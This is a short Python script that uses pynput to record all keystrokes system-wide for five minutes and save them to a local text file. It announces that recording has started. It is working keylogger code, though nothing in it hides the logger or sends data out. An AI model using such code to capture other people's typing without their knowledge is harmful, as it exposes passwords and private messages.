from pynput import keyboard
from datetime import datetime, timedelta
import threading

# File to save keystrokes
filename = "message.txt"
end_time = datetime.now() + timedelta(minutes=5)
log = []

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log.append(" ")
        elif key == keyboard.Key.enter:
            log.append("\n")
        else:
            log.append(f"[{key.name}]")

    # Stop after 5 minutes
    if datetime.now() >= end_time:
        return False

def save_log():
    with open(filename, "w", encoding="utf-8") as f:
        f.write("".join(log))

# Start listening
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Wait 5 minutes then stop and save
threading.Timer(300, lambda: (listener.stop(), save_log())).start()

print(f"Recording started. Typing will be saved to '{filename}' for 5 minutes...")
